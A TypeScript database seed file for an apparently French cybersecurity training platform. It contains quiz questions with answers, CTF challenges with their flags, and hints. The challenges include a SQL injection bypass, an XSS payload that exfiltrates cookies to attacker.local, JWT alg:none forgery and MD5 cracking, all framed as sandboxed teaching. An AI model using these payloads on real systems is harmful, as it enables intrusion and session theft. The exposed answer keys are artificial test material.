          text: "TCP garantit la livraison et l'ordre des paquets ; UDP est sans connexion et plus rapide",
        },
        { id: "c", text: "UDP est utilisé pour HTTP, TCP pour DNS" },
        { id: "d", text: "Il n'y a pas de différence significative" },
      ],
      correctOptionId: "b",
      explanation:
        "TCP établit une connexion, garantit l'ordre et la livraison des paquets (handshake, accusés de réception). UDP est sans connexion : plus rapide mais sans garantie de livraison.",
      orderIndex: 2,
    },
    // NETWORK - Intermediate
    {
      category: "NETWORK" as const,
      difficulty: "INTERMEDIATE" as const,
      question: "Quel port est utilisé par HTTPS par défaut ?",
      options: [
        { id: "a", text: "80" },
        { id: "b", text: "443" },
        { id: "c", text: "8080" },
        { id: "d", text: "22" },
      ],
      correctOptionId: "b",
      explanation:
        "HTTPS utilise le port 443 par défaut. HTTP utilise le port 80. SSH utilise le port 22.",
      orderIndex: 3,
    },
    // NETWORK - Intermediate
    {
      category: "NETWORK" as const,
      difficulty: "INTERMEDIATE" as const,
      question: "Qu'est-ce qu'un sous-réseau (subnet) ?",
      options: [
        { id: "a", text: "Un réseau câblé plus lent qu'un réseau principal" },
        {
          id: "b",
          text: "Une subdivision logique d'un réseau IP permettant de segmenter et isoler des hôtes",
        },
        { id: "c", text: "Le réseau physique entre deux routeurs" },
        { id: "d", text: "Un réseau secondaire utilisé uniquement pour la sauvegarde" },
      ],
      correctOptionId: "b",
      explanation:
        "Un sous-réseau est une partition logique d'un réseau IP. La segmentation améliore la sécurité, les performances et facilite la gestion des adresses.",
      orderIndex: 4,
    },
    // NETWORK - Advanced
    {
      category: "NETWORK" as const,
      difficulty: "ADVANCED" as const,
      question: "Qu'est-ce que le BGP (Border Gateway Protocol) ?",
      options: [
        { id: "a", text: "Un protocole de routage interne utilisé dans les petits réseaux" },
        {
          id: "b",
          text: "Le protocole de routage inter-domaines qui gère l'échange de routes entre Autonomous Systems sur Internet",
        },
        { id: "c", text: "Un protocole de chiffrement pour les VPN" },
        { id: "d", text: "Un protocole de gestion des adresses IP dynamiques" },
      ],
      correctOptionId: "b",
      explanation:
        "BGP est le protocole de routage de l'Internet. Il gère comment les paquets sont routés entre Autonomous Systems (AS) - les grands réseaux gérés par des opérateurs distincts.",
      orderIndex: 5,
    },
  ];

  for (const [i, q] of placementQuestions.entries()) {
    await prisma.placementQuestion.upsert({
      where: {
        id: `00000000-0000-0000-0001-${String(i + 1).padStart(12, "0")}`,
      },
      create: {
        id: `00000000-0000-0000-0001-${String(i + 1).padStart(12, "0")}`,
        ...q,
      },
      update: {},
    });
  }

  console.log("✅ Placement questions seeded");

  // ── Challenges ───────────────────────────────────────────────────────────

  const C1 = "00000000-0000-0000-0002-000000000001";
  const C2 = "00000000-0000-0000-0002-000000000002";
  const C3 = "00000000-0000-0000-0002-000000000003";
  const C4 = "00000000-0000-0000-0002-000000000004";
  const C5 = "00000000-0000-0000-0002-000000000005";
  const C6 = "00000000-0000-0000-0002-000000000006";
  const C7 = "00000000-0000-0000-0002-000000000007";
  const C8 = "00000000-0000-0000-0002-000000000008";

  await prisma.challenge.upsert({
    where: { refCode: "CTF-001" },
    create: {
      id: C1,
      refCode: "CTF-001",
      slug: "sql-injection-bypass",
      title: "Injection SQL - Bypass d'authentification",
      description:
        "Un formulaire de connexion vulnérable attend ta visite. Exploite une injection SQL classique pour bypasser l'authentification et récupérer le flag.",
      instructions: `## Contexte

Un développeur pressé a codé ce formulaire de connexion sans requêtes paramétrées :

\`\`\`php
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
\`\`\`

## Objectif

Le flag est affiché dans la réponse du serveur lorsque tu bypasses l'authentification.

## Environnement

Utilise le formulaire ci-dessous avec l'URL de connexion fournie.

\`\`\`
Email    : ' OR '1'='1' --
Password : anything
\`\`\`

## Ce que tu dois comprendre

1. Pourquoi \`' OR '1'='1' --\` ferme la condition et commente la suite ?
2. Quel est l'impact sur la requête SQL générée ?
3. Comment les requêtes paramétrées empêchent-elles cela ?

## Flag

Une fois connecté, le serveur affiche : \`CTF{sql_bypass_1_or_1_always_true}\``,
      category: "CYBERSEC" as const,
      difficulty: "BEGINNER" as const,
      type: "CTF" as const,
      xpReward: 200,
      timeLimitMin: 0,
      maxAttempts: 5,
      orderIndex: 1,
      flag: "CTF{sql_bypass_1_or_1_always_true}",
      isActive: true,
    },
    update: {},
  });

  await prisma.challenge.upsert({
    where: { refCode: "CTF-002" },
    create: {
      id: C2,
      refCode: "CTF-002",
      slug: "base64-decoding",
      title: "Base64 - L'encodage n'est pas du chiffrement",
      description:
        "Une chaîne encodée en Base64 se cache dans les headers HTTP de la réponse. Décode-la pour obtenir le flag.",
      instructions: `## Contexte

En inspectant les headers HTTP d'une réponse, tu trouves :

\`\`\`
X-Secret-Token: Q1RGe2Jhc2U2NF9pczBuT3RfZW5jcnlwdGlvbn0=
\`\`\`

## Objectif

Décode ce header pour obtenir le flag.

## Rappel : Base64

Base64 **encode** les données binaires en ASCII. Ce n'est **pas** du chiffrement - il n'y a pas de clé, n'importe qui peut décoder.

Tu peux décoder :
- En Python : \`import base64; base64.b64decode("...")\`
- En ligne de commande : \`echo "..." | base64 -d\`
- Sur [CyberChef](https://gchq.github.io/CyberChef/)

## Flag

Le résultat du décodage **est** le flag.`,
      category: "CYBERSEC" as const,
      difficulty: "BEGINNER" as const,
      type: "CTF" as const,
      xpReward: 150,
      timeLimitMin: 0,
      maxAttempts: 10,
      orderIndex: 2,
      flag: "CTF{base64_is0nOt_encryption}",
      isActive: true,
    },
    update: {},
  });

  await prisma.challenge.upsert({
    where: { refCode: "SCRIPT-001" },
    create: {
      id: C3,
      refCode: "SCRIPT-001",
      slug: "cesar-cipher-python",
      title: "Chiffrement de César - Déchiffre en Python",
      description:
        "Un message a été chiffré avec le chiffrement de César (décalage de 13). Écris un script Python pour le déchiffrer et afficher le flag.",
      instructions: `## Contexte

Tu interceptes ce message chiffré avec le chiffrement de César :

\`\`\`
SYNT{pnrfne_ebg13_vf_ernl}
\`\`\`

Le décalage utilisé est **13** (aussi connu sous le nom de ROT13).

## Objectif

Écris un script Python qui :
1. Prend le texte chiffré
2. Applique le décalage inverse (−13)
3. Affiche le flag déchiffré

## Algorithme de base

\`\`\`python
def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result
\`\`\`

## Validation

Le flag déchiffré doit être affiché avec \`print()\` pour être validé.`,
      category: "CYBERSEC" as const,
      difficulty: "BEGINNER" as const,
      type: "SCRIPT" as const,
      xpReward: 250,
      timeLimitMin: 0,
      maxAttempts: 10,
      orderIndex: 3,
      flag: "FLAG{caesar_rot13_is_ready}",
      starterCode: `# Message chiffré avec ROT13 (décalage de 13)
ciphertext = "SYNT{pnrfne_ebg13_vf_ernql}"

def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result

# Appelle la fonction avec le bon décalage et affiche le résultat
# print(caesar_decrypt(...))`,
      isActive: true,
    },
    update: {
      starterCode: `# Message chiffré avec ROT13 (décalage de 13)
ciphertext = "SYNT{pnrfne_ebg13_vf_ernql}"

def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result

# Appelle la fonction avec le bon décalage et affiche le résultat
# print(caesar_decrypt(...))`,
    },
  });

  await prisma.challenge.upsert({
    where: { refCode: "PUZZLE-001" },
    create: {
      id: C4,
      refCode: "PUZZLE-001",
      slug: "binaire-vers-ascii",
      title: "Binaire → ASCII - Décode le message",
      description:
        "Un message secret a été converti en binaire. Chaque groupe de 8 bits représente un caractère ASCII. Retrouve le flag.",
      instructions: `## Message binaire

\`\`\`
01000011 01010100 01000110 01111011
01100010 00110001 01101110 00110100
01110010 01111001 01011111 00110001
01110011 01011111 01100110 00110001
01110011 01101000 01111101
\`\`\`

## Rappel : ASCII et binaire

Chaque caractère ASCII correspond à un nombre entre 0 et 127.
En binaire sur 8 bits : \`A\` = \`01000001\` (65), \`a\` = \`01100001\` (97).

## Comment décoder

1. Convertis chaque groupe de 8 bits en nombre décimal
2. Trouve le caractère ASCII correspondant
3. Concatène les caractères pour former le flag

## Exemple

\`01000011\` = 64 + 2 + 1 = **67** = **'C'**

## Soumets le flag trouvé`,
      category: "DEV" as const,
      difficulty: "BEGINNER" as const,
      type: "PUZZLE" as const,
      xpReward: 100,
      timeLimitMin: 0,
      maxAttempts: 10,
      orderIndex: 4,
      isActive: true,
    },
    update: {},
  });

  // Resolve real IDs for challenges used as prerequisites
  const prereqC1 = await prisma.challenge.findUniqueOrThrow({
    where: { refCode: "CTF-001" },
    select: { id: true },
  });
  const prereqC2 = await prisma.challenge.findUniqueOrThrow({
    where: { refCode: "CTF-002" },
    select: { id: true },
  });

  await prisma.challenge.upsert({
    where: { refCode: "CTF-003" },
    create: {
      id: C5,
      refCode: "CTF-003",
      slug: "xss-reflechi-vol-cookie",
      title: "XSS Réfléchi - Vol de cookie de session",
      description:
        "Une application web reflète sans filtrage les paramètres GET dans la page. Injecte du JavaScript pour exfiltrer le cookie de session.",
      instructions: `## Contexte

L'application ci-dessous affiche un message de bienvenue basé sur le paramètre \`name\` :

\`\`\`
https://target.cyberlab.internal/welcome?name=Alice
\`\`\`

Résultat affiché : **Bonjour, Alice !**

## La vulnérabilité

Le serveur fait simplement :

\`\`\`php
echo "Bonjour, " . $_GET['name'] . " !";
\`\`\`

## Objectif

1. Injecte un payload XSS qui lit \`document.cookie\`
2. Envoie le cookie à ton serveur de contrôle (\`http://attacker.local:4444\`)
3. Le serveur de contrôle affichera le flag quand il reçoit le cookie

## Payload de base

\`\`\`html
<script>
  fetch("http://attacker.local:4444/?c=" + document.cookie);
</script>
\`\`\`

## Flag

Le serveur de contrôle te retourne : \`CTF{xss_r3fl3ct3d_c00k13_st0l3n}\`

> **Note légale :** Cette simulation est entièrement sandboxée. Ne jamais utiliser ces techniques sur de vraies applications sans autorisation.`,
      category: "CYBERSEC" as const,
      difficulty: "INTERMEDIATE" as const,
      type: "CTF" as const,
      xpReward: 350,
      timeLimitMin: 0,
      maxAttempts: 5,
      orderIndex: 5,
      flag: "CTF{xss_r3fl3ct3d_c00k13_st0l3n}",
      prerequisiteId: prereqC1.id,
      isActive: true,
    },
    update: {},
  });

  await prisma.challenge.upsert({
    where: { refCode: "SCRIPT-002" },
    create: {
      id: C6,
      refCode: "SCRIPT-002",
      slug: "analyse-hash-md5",
      title: "Crack de hash MD5 - Attaque par dictionnaire",
      description:
        "Un hash MD5 a été récupéré depuis une base de données compromise. Écris un script Python pour retrouver le mot de passe original par attaque dictionnaire.",
      instructions: `## Contexte

Lors d'une investigation, tu trouves ce hash dans un dump de base de données :

\`\`\`
5f4dcc3b5aa765d61d8327deb882cf99
\`\`\`

## Objectif

Écris un script Python qui attaque ce hash MD5 par dictionnaire en utilisant les mots de passe courants fournis ci-dessous.

## Wordlist intégrée

Utilise cette liste dans ton script :

\`\`\`python
wordlist = [
    "password", "123456", "password123", "admin", "letmein",
    "qwerty", "abc123", "monkey", "1234567890", "superman",
    "dragon", "master", "hello", "freedom", "whatever"
]
\`\`\`

## Validation

Quand tu trouves le bon mot de passe, affiche :
\`FLAG{md5_<mot_de_passe_trouvé>}\`

## Rappel : hashlib

\`\`\`python
import hashlib
hashlib.md5("password".encode()).hexdigest()
\`\`\``,
      category: "CYBERSEC" as const,
      difficulty: "INTERMEDIATE" as const,
      type: "SCRIPT" as const,
      xpReward: 400,
      timeLimitMin: 0,
      maxAttempts: 10,
      orderIndex: 6,
      flag: "FLAG{md5_password}",
      starterCode: `import hashlib

target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"

wordlist = [
    "password", "123456", "password123", "admin", "letmein",
    "qwerty", "abc123", "monkey", "1234567890", "superman",
    "dragon", "master", "hello", "freedom", "whatever"
]

# Parcours la wordlist et compare les hash
for word in wordlist:
    h = hashlib.md5(word.encode()).hexdigest()
    # TODO: comparer h avec target_hash
    # Si trouvé, afficher FLAG{md5_<word>}
    pass`,
      isActive: true,
    },
    update: {},
  });

  await prisma.challenge.upsert({
    where: { refCode: "CTF-004" },
    create: {
      id: C7,
      refCode: "CTF-004",
      slug: "jwt-alg-none-bypass",
      title: "JWT - Bypass avec alg:none",
      description:
        "Un serveur accepte les tokens JWT sans vérifier la signature si l'algorithme est défini sur 'none'. Forge un token admin et récupère le flag.",
      instructions: `## Contexte

L'API utilise des JWT pour l'authentification. Tu as obtenu ce token en tant qu'utilisateur normal :

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
\`\`\`

## Structure du token

Un JWT = 3 parties encodées en Base64url, séparées par des points :
1. **Header** : \`{"alg":"HS256","typ":"JWT"}\`
2. **Payload** : \`{"user":"alice","role":"user","iat":1700000000}\`
3. **Signature** : HMAC-SHA256 du header + payload

## La vulnérabilité

Certaines implémentations acceptent \`"alg":"none"\` et ignorent alors la signature.

## Objectif

1. Modifie le payload pour avoir \`"role":"admin"\`
2. Change l'algorithme en \`"none"\`
3. Supprime la signature (le 3ème segment doit être vide)
4. Envoie la requête vers l'endpoint admin

## Format final

\`\`\`
<header_base64url>.<payload_base64url>.
\`\`\`

> Note : Base64url diffère de Base64 standard (\`+\`→\`-\`, \`/\`→\`_\`, sans \`=\` de padding)

## Flag

L'endpoint admin retourne : \`CTF{jwt_alg_none_n3v3r_trust_cl13nt}\``,
      category: "CYBERSEC" as const,
      difficulty: "INTERMEDIATE" as const,
      type: "CTF" as const,
      xpReward: 500,
      timeLimitMin: 0,
      maxAttempts: 5,
      orderIndex: 7,
      flag: "CTF{jwt_alg_none_n3v3r_trust_cl13nt}",
      prerequisiteId: prereqC2.id,
      isActive: true,
    },
    update: {},
  });

  await prisma.challenge.upsert({
    where: { refCode: "LAB-001" },
    create: {
      id: C8,
      refCode: "LAB-001",
      slug: "reconnaissance-osint",
      title: "Reconnaissance OSINT - Trouver l'infrastructure",
      description:
        "Applique les techniques OSINT pour cartographier l'infrastructure d'une organisation cible fictive : sous-domaines, technologies, fuites d'informations.",
      instructions: `## Objectif du lab

Dans ce lab, tu vas pratiquer la **reconnaissance passive** (sans contact direct avec la cible) sur l'organisation fictive **MegaCorp Industries** (\`megacorp-fictif.internal\`).

## Étapes

### 1. Énumération de sous-domaines

Utilise les sources OSINT suivantes (adaptées à la cible fictive) :
- Certificate Transparency Logs : [crt.sh](https://crt.sh)
- Moteurs de recherche : opérateurs \`site:\` et \`inurl:\`
- DNS brute-force passif

**Question :** Combien de sous-domaines uniques trouves-tu ?

### 2. Identification des technologies

Via les headers HTTP et les métadonnées publiques :
- \`X-Powered-By\`
- Cookies de session (noms révélateurs)
- Fichiers \`robots.txt\` et \`sitemap.xml\`

**Question :** Quel framework est utilisé sur \`admin.megacorp-fictif.internal\` ?

### 3. Recherche de fuites

- GitHub : cherche des dépôts contenant "megacorp" avec des clés API
- Shodan / Censys : ports exposés involontairement
- Wayback Machine : anciennes versions de pages

### 4. Rapport

Documente tes découvertes dans un rapport structuré :
1. Périmètre identifié
2. Technologies détectées
3. Vecteurs d'attaque potentiels
4. Recommandations

## Complétion

Ce lab est validé sur présentation d'un rapport de reconnaissance. Clique sur **"Marquer comme terminé"** une fois ton rapport rédigé.

> **Rappel éthique :** Ces techniques ne s'appliquent qu'avec une autorisation explicite du propriétaire du système. Ce lab est purement fictif.`,
      category: "CYBERSEC" as const,
      difficulty: "ADVANCED" as const,
      type: "LAB" as const,
      xpReward: 600,
      timeLimitMin: 120,
      maxAttempts: 1,
      orderIndex: 8,
      isActive: true,
    },
    update: {},
  });

  console.log("✅ Challenges seeded");

  // ── Challenge hints ────────────────────────────────────────────────────────
  // Resolve real challenge IDs from DB (seed may run on existing data)

  const [chC1, chC2, chC3, chC5, chC6, chC7] = await Promise.all([
    prisma.challenge.findUniqueOrThrow({ where: { refCode: "CTF-001" }, select: { id: true } }),
    prisma.challenge.findUniqueOrThrow({ where: { refCode: "CTF-002" }, select: { id: true } }),
    prisma.challenge.findUniqueOrThrow({ where: { refCode: "SCRIPT-001" }, select: { id: true } }),
    prisma.challenge.findUniqueOrThrow({ where: { refCode: "CTF-003" }, select: { id: true } }),
    prisma.challenge.findUniqueOrThrow({ where: { refCode: "SCRIPT-002" }, select: { id: true } }),
    prisma.challenge.findUniqueOrThrow({ where: { refCode: "CTF-004" }, select: { id: true } }),
  ]);

  const hintDefs = [
    // CTF-001 - SQL Injection
    {
      challengeId: chC1.id,
      content:
        "Les commentaires SQL varient selon le SGBD : `--` pour MySQL/PostgreSQL, `#` pour MySQL uniquement.",
      xpCost: 0,
      orderIndex: 1,
    },
    {
      challengeId: chC1.id,
      content: "Essaie : `' OR 1=1 --` comme email. La condition `1=1` est toujours vraie.",
      xpCost: 30,
      orderIndex: 2,
    },
    // CTF-002 - Base64
    {
      challengeId: chC2.id,
      content:
        "Les chaînes Base64 se terminent souvent par `=` ou `==` (padding). Utilise `echo '...' | base64 -d` en terminal.",
      xpCost: 0,
      orderIndex: 1,
    },
    // SCRIPT-001 - César
    {
      challengeId: chC3.id,
      content:
        "ROT13 est un cas particulier de César où décalage = 13. Appliquer ROT13 deux fois redonne le texte original.",
      xpCost: 0,
      orderIndex: 1,
    },
    {
      challengeId: chC3.id,
      content:
        "Le flag chiffré commence par `SYNT{` - `S`→`F`, `Y`→`L`, `N`→`A`, `T`→`G`. Ça confirme le décalage de 13.",
      xpCost: 40,
      orderIndex: 2,
    },
    // CTF-003 - XSS
    {
      challengeId: chC5.id,
      content:
        "Commence par tester si le paramètre est bien réfléchi : essaie `?name=<b>test</b>` et inspecte le DOM.",
      xpCost: 0,
      orderIndex: 1,
    },
    {
      challengeId: chC5.id,
      content:
        "Si `<script>` est filtré, essaie `<img src=x onerror=alert(1)>` pour contourner le filtre.",
      xpCost: 50,
      orderIndex: 2,
    },
    {
      challengeId: chC5.id,
      content:
        "Payload complet : `<script>fetch('http://attacker.local:4444/?c='+document.cookie)</script>`. Encode les caractères spéciaux si nécessaire.",
      xpCost: 80,
      orderIndex: 3,
    },
    // SCRIPT-002 - MD5
    {
      challengeId: chC6.id,
      content:
        "MD5 est déterministe : le même input donne toujours le même hash. L'attaque dictionnaire compare les hashes pré-calculés.",
      xpCost: 0,
      orderIndex: 1,
    },
    {
      challengeId: chC6.id,
      content:
        "`5f4dcc3b5aa765d61d8327deb882cf99` est un hash MD5 très connu. Il apparaît dans toutes les rainbow tables.",
      xpCost: 60,
      orderIndex: 2,
    },
    // CTF-004 - JWT
    {
      challengeId: chC7.id,
      content:
        "Décode le header JWT avec Python : `import base64; base64.b64decode(part + '==').decode()`",
      xpCost: 0,
      orderIndex: 1,
    },
    {
      challengeId: chC7.id,
      content:
        "Pour encoder en Base64url : remplace `+` par `-`, `/` par `_`, et supprime les `=` de padding.",
      xpCost: 50,
      orderIndex: 2,
    },
    {
      challengeId: chC7.id,
      content: `Header forgé : \`{"alg":"none","typ":"JWT"}\` → \`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0\`. Payload : change "role":"user" en "role":"admin".`,
      xpCost: 100,
      orderIndex: 3,
    },
  ];

  for (const h of hintDefs) {
    const existing = await prisma.challengeHint.findFirst({
      where: { challengeId: h.challengeId, orderIndex: h.orderIndex },
      select: { id: true },
    });
    if (existing) {
      await prisma.challengeHint.update({ where: { id: existing.id }, data: h });
    } else {
      await prisma.challengeHint.create({ data: h });
    }
  }

  console.log("✅ Challenge hints seeded");
  console.log("\n🎉 Seeding complete!");
  console.log(
    "\nDev accounts (you need to create these in Supabase Auth manually or via magic link):",
  );
  console.log("  Admin:     admin@cyberlearn.app");
  console.log("  Student 1: alice@example.com");
  console.log("  Student 2: bob@example.com");
}

main()
  .catch((e) => {
    console.error("❌ Seed failed:", e);
    process.exit(1);
  })
  .finally(() => {
    void prisma.$disconnect();
  });
